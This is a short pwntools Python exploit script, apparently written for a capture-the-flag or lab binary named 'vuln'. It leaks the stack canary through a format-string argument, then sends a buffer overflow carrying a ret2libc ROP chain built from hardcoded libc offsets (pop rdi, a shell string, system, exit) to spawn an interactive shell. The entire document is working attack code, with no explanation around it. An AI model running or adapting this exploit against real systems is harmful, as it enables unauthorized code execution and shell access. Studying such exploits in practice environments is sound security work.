#!/usr/bin/python3

from pwn import *
from struct import pack

exe = context.binary = ELF('./vuln')

libc_base_address = 0x00007ffff7dd1000
shell = libc_base_address + 0x1b45bd
syscall = libc_base_address + 0x52290
exitcall = libc_base_address + 0x46a40
ret = libc_base_address + 0x0000000000022679
pop_rdi = libc_base_address + 0x0000000000023b6a

print("[+] Spwaning process...")

io = process([exe.path, "%33$llx"])
canary = int(io.readline().strip(), 16)

print("[+] Canary leaked: {}".format(hex(canary)))

buffer = b'A'*200
buffer += p64(canary)
buffer += b'\x42' * 8
buffer += p64(ret)
buffer += p64(pop_rdi)
buffer += p64(shell)
buffer += p64(syscall)
buffer += p64(exitcall)

io.sendline(buffer)
io.interactive()